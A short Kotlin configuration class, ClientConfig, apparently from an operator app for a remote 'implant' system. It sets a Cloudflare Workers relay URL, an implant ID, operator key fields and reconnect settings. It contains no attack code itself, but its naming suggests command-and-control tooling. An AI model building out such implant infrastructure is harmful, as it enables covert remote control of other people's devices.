package com.shadow.operator.data

import com.shadow.operator.BuildConfig

data class ClientConfig(
    val workerUrl: String = "https://shadow-v2.marwannaili-23-07.workers.dev",
    val implantId: String = "e7c0c3ab-90cb-4b73-ae88-95493173a112",
    val operatorPubKey: String = "",
    val operatorPrivKey: String = BuildConfig.OPERATOR_PRIV_KEY ?: "",
    val autoReconnect: Boolean = true,
    val reconnectIntervalSec: Int = 30
)
